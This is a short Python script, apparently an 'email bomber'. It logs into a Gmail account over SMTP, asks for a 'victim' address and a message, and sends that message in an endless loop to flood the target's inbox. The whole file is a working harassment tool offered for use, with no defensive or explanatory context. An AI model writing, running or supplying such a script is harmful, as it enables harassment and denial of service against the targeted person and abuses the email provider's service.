import smtplib as s

print ('\n\r\n\rBomber test log gmail. \n\r')

username = input("Gmail Username: ")
password = input("Gmail Password: ")

obj = s.SMTP("smtp.gmail.com:587")
obj.starttls()
obj.login(username, password)
print ("\n\r")

v_email = input("Victime Email: ")
message = input("Message: ")
email_message = (" \r\n\r\n From: %s\r\n To: %s\r\n\r\n  %s"
    % (username, "" .join(v_email), "" .join(message)))
    
while 1:
    obj.sendmail(username, v_email, email_message)
    print ("Bombing... Fait Ctrl + C pour stop")